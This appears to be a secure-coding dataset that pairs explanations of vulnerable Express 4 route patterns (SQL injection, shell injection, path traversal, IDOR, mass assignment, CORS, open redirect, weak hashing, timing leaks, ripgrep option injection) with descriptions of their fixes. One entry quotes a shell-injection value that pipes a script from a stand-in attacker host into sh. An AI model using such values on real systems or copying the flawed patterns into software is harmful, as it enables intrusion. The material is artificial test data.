cases.why: Every other filter is bound as a placeholder, but the status filter is spliced into the WHERE clause as a single-quoted literal, so a status value containing a quote closes the literal and appends attacker-chosen SQL to the statement that pool.query executes.

The same filter surface, but every caller-supplied value — state, destination, cutoff, limit and offset — is bound as a numbered placeholder, and the only interpolated fragments are the sort column and direction resolved through a fixed map and a two-way ternary, so no request text reaches the statement text.

cases.why: The request body's label is interpolated into the archive name and then into a string handed to child_process.exec, which runs it through /bin/sh; a label such as "a; curl attacker.example | sh" executes as a separate shell command with the application's privileges.

The same tar invocation goes through execFile with a fixed argv array, so no shell parses the arguments, and the label is additionally rejected unless it matches a lowercase slug pattern before it ever reaches the file name.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The file name arrives from the path parameter and is joined onto the attachment root with no normalisation or containment check, so a value with encoded ../ segments resolves outside the root and the stream returns any file the process can read.

The same path-parameter file name is reduced to its basename, resolved against the statement root, and then rejected with a 400 unless the resolved path still sits under that root, so traversal segments cannot escape the directory.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The list route above scopes on account_id, but the detail route resolves the order from the path parameter alone; any signed-in user who guesses or enumerates an id receives another account's order, including billing email and shipping address.

The detail query carries the authenticated account alongside the path parameter in the WHERE clause and returns 404 when nothing matches, so a shipment belonging to another account is indistinguishable from one that does not exist.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The whole request body is spread into the Knex update; only id, team_id and created_at are stripped, so a caller can also send role or seat_type — columns the people form never exposes — and promote a member or hand out a paid seat.

The update object is assembled field by field from named body properties, each type-checked and the seat type validated against a fixed set, so any extra property in the payload is simply never copied into the row.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The middleware echoes whatever Origin the request carried back as Access-Control-Allow-Origin and pairs it with Allow-Credentials: true, so any site a signed-in shopper visits can read the credentialed session and cart response cross-origin.

The origin is echoed only after a membership test against a configured allowlist, and the response varies on Origin, so an unregistered site receives no cross-origin permission at all despite the header being reflected for the allowed ones.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The failure response hands the client the driver's message and detail, the failing SQL statement and the full stack trace, which discloses table and column names, absolute source paths and dependency layout to anyone who can make the import fail.
The same catch block logs the error object server-side with a generated trace id and returns only a fixed sentence plus that id, so the client learns nothing about the query, the schema or the stack.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The post-sign-in destination is taken straight from the request's next parameter and passed to res.redirect with no check that it is a local path, so a crafted sign-in link sends the freshly authenticated visitor to an absolute attacker URL that looks like it came from the application.

The destination passes through a helper that requires a single leading slash and rejects protocol-relative and backslash-escaped forms, falling back to the dashboard, so only a same-origin path can be reached by redirect.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The stored credential is a bare SHA-256 digest of the password: no salt, no work factor, so a leaked users table is recoverable at billions of guesses per second and identical passwords collide across accounts.
The password is put through argon2id with an explicit memory cost, time cost and parallelism, which produces a salted, deliberately slow digest, so the stored value resists offline cracking.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The secret half of the API key is compared with !==, which short-circuits at the first differing byte; the response time therefore leaks how much of the secret was correct, letting a caller who knows a key id recover the secret byte by byte.

The presented secret is compared with crypto.timingSafeEqual after an explicit length check, so the comparison takes the same time regardless of how many bytes match and reveals nothing about the stored value.

cases.architecture: Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses
cases.why: The executable is fixed and there is no shell, but the search term occupies a positional argv slot with no -- separator and no leading-dash check, so a term beginning with a dash is parsed by ripgrep as an option: --pre=<program> makes it run that program over every file, and -f<path> turns the search into a read of an arbitrary file.

The same ripgrep call passes the search term as the value of an explicit --regexp option and terminates option parsing with -- before the search root, so a term beginning with a dash is treated as pattern text and can never become a flag.
